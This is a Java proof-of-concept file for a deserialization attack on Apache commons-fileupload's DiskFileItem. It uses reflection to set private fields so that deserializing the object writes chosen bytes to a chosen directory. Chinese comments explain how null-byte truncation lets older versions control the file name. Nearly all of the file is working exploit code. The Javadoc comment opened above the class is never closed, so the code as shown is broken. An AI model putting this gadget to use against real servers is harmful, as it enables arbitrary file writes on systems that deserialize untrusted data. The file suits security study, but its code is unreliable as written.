package upload;

import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.*;
import java.lang.reflect.Field;

/**
 * commons-fileupload < 1.3 可以使用\0(\u0000)截断，便可以控制文件名
 * commons-fileupload > = 1.3.1 新增了\0的判断，文件名使用 format("upload_%s_%s.tmp", UID, getUniqueId()) 生成随机的文件名()，所以高版本只能生产一些垃圾文件
 * DiskFileItem#readObject()
public class fileupload {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        String charset = "utf-8";
        byte[] bytes = "flag{success!123}".getBytes(charset);
        File mulu = new File("C:\\Users\\86136\\Desktop\\cc1\\src\\main\\java\\upload");
      
        DeferredFileOutputStream deferredFileOutputStream = new DeferredFileOutputStream(0, mulu);


        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, mulu);

      //dfos不为空，获取到内存中的值
        Field dfos = diskFileItem.getClass().getDeclaredField("dfos");
        dfos.setAccessible(true);
        dfos.set(diskFileItem,deferredFileOutputStream);

      //写入的内容
      //若cachedContent为空，会复制文件然后删除原文件
        Field cachedContent = diskFileItem.getClass().getDeclaredField("cachedContent");
        cachedContent.setAccessible(true);
        cachedContent.set(diskFileItem,bytes);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeObject(diskFileItem);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
